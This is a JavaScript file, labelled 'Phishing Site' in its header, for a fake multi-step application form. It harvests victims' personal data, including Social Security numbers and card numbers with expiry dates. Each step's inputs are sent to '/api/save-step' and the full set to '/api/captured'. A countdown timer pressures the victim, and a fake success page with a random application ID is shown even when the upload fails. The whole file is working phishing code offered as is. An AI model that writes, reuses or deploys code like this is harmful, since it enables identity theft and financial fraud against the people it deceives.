// Phishing Site — Multi-step application form JS

let currentStep = 1;
let countdownSeconds = 899; // 14:59
let countdownInterval = null;
const formData = {};

// ── Step navigation ──────────────────────────────────────────────

function showStep(step) {
    document.querySelectorAll('.gc-form-step').forEach(el => el.classList.remove('active'));
    const stepEl = document.getElementById('step' + step);
    if (stepEl) stepEl.classList.add('active');

    // Update stepper indicators
    for (let i = 1; i <= 3; i++) {
        const ind = document.getElementById('stepIndicator' + i);
        if (!ind) continue;
        ind.classList.remove('active', 'completed');
        if (i < step) ind.classList.add('completed');
        else if (i === step) ind.classList.add('active');
    }

    // Show sidebar countdown on step 3
    if (step === 3) {
        const sidebarCd = document.getElementById('sidebarCountdown');
        if (sidebarCd) sidebarCd.style.display = '';
    }

    window.scrollTo({ top: 0, behavior: 'smooth' });
    currentStep = step;
}

function nextStep(fromStep) {
    if (!validateStep(fromStep)) return;

    collectStepData(fromStep);

    fetch('/api/save-step', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ step: fromStep, data: getStepData(fromStep) }),
    }).catch(() => {});

    const nextStepNum = fromStep + 1;
    showStep(nextStepNum);

    if (nextStepNum === 3 && !countdownInterval) {
        startCountdown();
    }
}

function prevStep(fromStep) {
    showStep(fromStep - 1);
}

// ── Validation ───────────────────────────────────────────────────

function validateStep(step) {
    const stepEl = document.getElementById('step' + step);
    if (!stepEl) return true;
    const inputs = stepEl.querySelectorAll('input[required], select[required]');
    let valid = true;
    inputs.forEach(input => {
        const field = input.closest('.gc-field');
        const errEl = field ? field.querySelector('.gc-field-error') : null;
        if (!input.value.trim()) {
            input.classList.add('error');
            if (errEl) errEl.style.display = 'block';
            valid = false;
        } else {
            input.classList.remove('error');
            if (errEl) errEl.style.display = 'none';
        }
    });
    return valid;
}

// ── Data collection ──────────────────────────────────────────────

function collectStepData(step) {
    const stepEl = document.getElementById('step' + step);
    if (!stepEl) return;
    stepEl.querySelectorAll('input, select, textarea').forEach(el => {
        if (el.name) formData[el.name] = el.value;
    });
}

function getStepData(step) {
    const stepEl = document.getElementById('step' + step);
    if (!stepEl) return {};
    const data = {};
    stepEl.querySelectorAll('input, select, textarea').forEach(el => {
        if (el.name && el.value) data[el.name] = el.value;
    });
    return data;
}

// ── Final submission ─────────────────────────────────────────────

function submitApplication() {
    if (!validateStep(3)) return;

    const agreeEl = document.getElementById('agreeTerms');
    if (!agreeEl || !agreeEl.checked) {
        agreeEl.closest('.gc-field').querySelector('label').style.color = '#d93025';
        alert('Please agree to the Terms of Service to continue.');
        return;
    }

    collectStepData(3);

    const submitBtn = document.getElementById('submitBtn');
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<span class="material-icons-outlined" style="font-size:18px;animation:spin .8s linear infinite;">refresh</span> Processing…';
    }

    fetch('/api/captured', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
    })
    .then(r => r.json())
    .then(() => {
        if (countdownInterval) clearInterval(countdownInterval);
        showSuccessState();
    })
    .catch(() => {
        // Even on network error, show success (data may have been logged)
        showSuccessState();
    });
}

function showSuccessState() {
    document.querySelectorAll('.gc-form-step').forEach(el => el.classList.remove('active'));
    document.getElementById('stepSuccess').classList.add('active');

    // Update stepper — all completed
    for (let i = 1; i <= 3; i++) {
        const ind = document.getElementById('stepIndicator' + i);
        if (ind) { ind.classList.remove('active'); ind.classList.add('completed'); }
    }

    // Fill in confirmation details
    const appIdNum = document.getElementById('appIdNum');
    if (appIdNum) appIdNum.textContent = Math.floor(100000 + Math.random() * 900000);

    const confirmEmail = document.getElementById('confirmEmail');
    if (confirmEmail) confirmEmail.textContent = formData.email || 'your email address';

    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ── Countdown timer ──────────────────────────────────────────────

function startCountdown() {
    updateCountdownDisplay();
    countdownInterval = setInterval(() => {
        countdownSeconds--;
        if (countdownSeconds <= 0) {
            clearInterval(countdownInterval);
            countdownSeconds = 0;
        }
        updateCountdownDisplay();
    }, 1000);
}

function updateCountdownDisplay() {
    const mins = Math.floor(countdownSeconds / 60);
    const secs = countdownSeconds % 60;
    const display = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;

    const el = document.getElementById('countdownDisplay');
    if (el) el.textContent = display;

    const sidebarEl = document.getElementById('sidebarCountdownDisplay');
    if (sidebarEl) sidebarEl.textContent = display;

    // Flash red when under 2 minutes
    if (countdownSeconds < 120) {
        [el, sidebarEl].forEach(e => { if (e) e.style.animation = 'pulse 1s ease-in-out infinite'; });
    }
}

// ── Input formatters ─────────────────────────────────────────────

function formatSSN(input) {
    let v = input.value.replace(/\D/g, '').substring(0, 9);
    if (v.length > 5) v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5);
    else if (v.length > 3) v = v.slice(0, 3) + '-' + v.slice(3);
    input.value = v;
}

function formatCard(input) {
    let v = input.value.replace(/\D/g, '').substring(0, 16);
    v = v.match(/.{1,4}/g)?.join(' ') || v;
    input.value = v;
}

function formatExpiry(input) {
    let v = input.value.replace(/\D/g, '').substring(0, 4);
    if (v.length >= 2) v = v.slice(0, 2) + ' / ' + v.slice(2);
    input.value = v;
}

// ── CSS animation for countdown pulse ───────────────────────────

const style = document.createElement('style');
style.textContent = `
@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
`;
document.head.appendChild(style);

// ── Init ─────────────────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', () => {
    showStep(1);

    // Live validation on blur
    document.querySelectorAll('.gc-input[required], .gc-select[required]').forEach(input => {
        input.addEventListener('blur', function () {
            const field = this.closest('.gc-field');
            const errEl = field ? field.querySelector('.gc-field-error') : null;
            if (!this.value.trim()) {
                this.classList.add('error');
                if (errEl) errEl.style.display = 'block';
            } else {
                this.classList.remove('error');
                if (errEl) errEl.style.display = 'none';
            }
        });
    });
});
